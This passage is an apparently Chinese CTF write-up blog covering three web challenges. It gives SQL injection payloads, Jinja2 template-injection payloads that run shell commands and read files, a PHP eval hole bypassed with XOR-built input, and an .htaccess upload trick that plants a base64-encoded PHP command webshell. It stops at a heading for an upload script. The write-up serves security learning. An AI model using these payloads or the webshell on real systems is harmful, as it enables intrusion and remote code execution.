&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;（ps：跟我做的登陆页面好像）&lt;/p&gt;
&lt;p&gt;注入点就在这里 username，没有任何过滤，但是很难想到，因为进去后有一个修改信息的东西过滤了‘和 “，我直接在那里面搞好久，发现不能用宽字节绕过，（然后就不知道怎么办 了）所以就看了 wp，发现就是这里有注入点。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;
username =1&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;#

username =1&#39; union select flag from flag #
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;常规操作，但是没找到注入点，有点可惜。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/October2019TwiceSQLInjection/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;ciscn2019-华东南赛区double-secret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2019-华东南赛区double-secret&#34;&gt;#&lt;/a&gt; [CISCN2019 华东南赛区] Double Secret&lt;/h2&gt;
&lt;p&gt;由标题可以知道：有两个 secret；尝试 /secret&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;网页显示是给个参数他就会给你加密（但是却是解密）&lt;/p&gt;
&lt;p&gt;有两个 secret 可以在参数这里猜:&lt;/p&gt;
&lt;p&gt;加？secret=12345 发现错误：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现是 ssti 报错：盲猜 jinja2：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1hcHAtODU1Zi5weQ==&#34;&gt;找 app.py&lt;/span&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-pyhton&#34;&gt; if(secret==None):
        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;
    rc=rc4_Modified.RC4(&amp;quot;HereIsTreasure&amp;quot;)   #解密
    deS=rc.do_crypt(secret)

    a=render_template_string(safe(deS))

    if &#39;ciscn&#39; in a.lower():
        return &#39;flag detected!&#39;  
    return a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以发现是加了一个 rc4 的解密，密钥为：HereIsTreasure&lt;/p&gt;
&lt;p&gt;我直接搞个加密 rc4 的密钥一样就可以了：&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;读 flag.txt  payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;/flag.txt&#39;).read()&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是要加一个 url 加密，在加一个加密所有字符（因为好像直接输入会丢字符）&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BCISCN2019huaodngnansaiqu%5DDoubleSecret/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;suctf-2019easyweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf-2019easyweb&#34;&gt;#&lt;/a&gt; [SUCTF 2019]EasyWeb&lt;/h2&gt;
&lt;p&gt;代码审计题：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
function get_the_flag()&amp;#123;
    // webadmin will remove your upload file every 20 min!!!!
    $userdir = &amp;quot;upload/tmp_&amp;quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
    if(!file_exists($userdir))&amp;#123;
    mkdir($userdir);
    &amp;#125;
    if(!empty($_FILES[&amp;quot;file&amp;quot;]))&amp;#123;
        $tmp_name = $_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;];
        $name = $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;];
        $extension = substr($name, strrpos($name,&amp;quot;.&amp;quot;)+1);
    if(preg_match(&amp;quot;/ph/i&amp;quot;,$extension)) die(&amp;quot;^_^&amp;quot;);
        if(mb_strpos(file_get_contents($tmp_name), &#39;&amp;lt;?&#39;)!==False) die(&amp;quot;^_^&amp;quot;);
    if(!exif_imagetype($tmp_name)) die(&amp;quot;^_^&amp;quot;);
        $path= $userdir.&amp;quot;/&amp;quot;.$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    &amp;#125;
&amp;#125;

$hhh = @$_GET[&#39;_&#39;];

if (!$hhh)&amp;#123;
    highlight_file(__FILE__);
&amp;#125;

if(strlen($hhh)&amp;gt;18)&amp;#123;
    die(&#39;One inch long, one inch strong!&#39;);
&amp;#125;

if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&amp;quot;\`~_&amp;amp;.,|=[\x7F]+/i&#39;, $hhh) )
    die(&#39;Try something else!&#39;);

$character_type = count_chars($hhh, 3);
if(strlen($character_type)&amp;gt;12) die(&amp;quot;Almost there!&amp;quot;);

eval($hhh);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;题解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题解&#34;&gt;#&lt;/a&gt; 题解&lt;/h2&gt;
&lt;h3 id=&#34;1无字母数字shell构造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1无字母数字shell构造&#34;&gt;#&lt;/a&gt; 1. 无字母数字 shell 构造&lt;/h3&gt;
&lt;p&gt;思路源于 p 神的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vcGVuZXRyYXRpb24vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS5odG1s&#34;&gt;一些不包含数字和字母的 webshell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;因为屏蔽了字母数字，可以思路可以往无字母数字 getshell 上走，大致有：或，异或，取反三个方案。&lt;/p&gt;
&lt;p&gt;因为检测～，所以取反不可行。&lt;/p&gt;
&lt;p&gt;于是跑脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; re&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# Python 中正则不需要在首位加 //&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;preg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;[\x00- 0-9A-Za-z\&#39;&#34;\`~_&amp;amp;.,|=[\x7F]+&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;_GET&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;istr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;jstr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    check &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#“Use of undefined constant” 视 ascii 码大于 0x7f 的字符为字符串，7.2 后提出要废弃&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;128&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;preg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;I&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;preg&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; re&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;I&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%&amp;#123;:0&gt;2&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;%&amp;#123;:0&gt;2&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    istr &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; i&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    jstr &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; j&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    check &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; check &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# php 经典特性，没加引号则视为字符串，所以可以不加引号减少字符数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# abc^def 等价于 (a^d).(b^e).(c^f), 前者可以大幅减少字符数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;$&amp;#123;%s^%s&amp;#125;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;istr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; jstr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为还限制了字符类型，所以尽量用重复的字符。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;在字符串的变量的后面跟上&amp;#123;&amp;#125;大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理，所以$_GET[&#39;c&#39;]等价于$_GET&amp;#123;&#39;c&#39;&amp;#125;，但这个问题7.4报warn，8.0可能会被处理。

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2019%5DEasyWeb/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;df&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;c7&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;c5&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;d4&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;phpinfo&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;直接获取 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSUCTF2019%5DEasyWeb/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;扩展最简情况的字符考量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩展最简情况的字符考量&#34;&gt;#&lt;/a&gt; 扩展：最简情况的字符考量&lt;/h4&gt;
&lt;p&gt;经测试，在这种最简情况下，尽量用大于 0x7f 的字符进行异或，否则在 urldecode 的时候会造成错误。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;%24^%7b&lt;/code&gt;  结果为 &lt;code&gt;_&lt;/code&gt; , 但 &lt;code&gt;%24&lt;/code&gt; urldecode 结果是 &lt;code&gt;$&lt;/code&gt; , 就与 payload 里的 &lt;code&gt;$&lt;/code&gt;  造成冲突。&lt;/p&gt;
&lt;p&gt;如果加了引号，则不用担心这个问题。&lt;/p&gt;
&lt;h3 id=&#34;2利用htaccess文件上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2利用htaccess文件上传&#34;&gt;#&lt;/a&gt; 2. 利用.htaccess 文件上传&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;.htaccess 文件提供了针对目录改变配置的方法，在一个&lt;strong&gt;特定的文档目录&lt;/strong&gt;中放置一个包含一个或多个指令的文件，以作用于&lt;strong&gt;此目录及其所有子目录&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;加了很多限制，所以是要利用 &lt;code&gt;get_the_flag()&lt;/code&gt;  函数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exif_imagetype&lt;/code&gt;  第一反应肯定是图片马，所以考虑图片马构造，但 &lt;code&gt;&amp;lt;?&lt;/code&gt;  被限制，导致大部分一句话木马都被过滤了，而 &lt;code&gt;&amp;lt;script language=&#39;php&#39;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;  又只能在 php5 环境下使用&lt;/p&gt;
&lt;p&gt;所以将一句话进行 base64 编码，然后在.htaccess 中利用 php 伪协议进行解码&lt;/p&gt;
&lt;h4 id=&#34;htaccess文件头检测绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#htaccess文件头检测绕过&#34;&gt;#&lt;/a&gt; .htaccess + 文件头检测绕过&lt;/h4&gt;
&lt;p&gt;因为有 &lt;code&gt;exif_imagetype&lt;/code&gt;  进行文件头检测，一般是加 &lt;code&gt;GIF89a&lt;/code&gt;  进行绕过，但在这里会导致 &lt;code&gt;.htaccess&lt;/code&gt;  文件无法正常生效，所以在 &lt;code&gt;.htaccess&lt;/code&gt;  文件中加上&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;#define width 1337
#define height 1337
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是 &lt;code&gt;.htaccess&lt;/code&gt;  文件内容如下&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define width 1337&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define height 1337&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;AddType application&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;x&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;httpd&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;php &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php_value auto_append_file &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;php://filter/convert.base64-decode/resource=./shell.a&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;shell.a&lt;/code&gt;  文件内容如下，多加了 12 是为了补足 8 个字节，满足 base64 编码的规则，&lt;s&gt;太细了&lt;/s&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;base64 编码要求：每三个字节 / 字符一组，也就是字符数是 3 的整数倍 (因为是 ascii 码，所以一个字节等于一个字符&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;GIF89a12&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;Pg&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为 exif_imagetype 是检测开头字符，所以注意 GIF89a12 前面不要有换行符，不要有空格，python 三单引号形式字符串注意换行符。&lt;/p&gt;
&lt;p&gt;上传脚本：&lt;/p&gt;
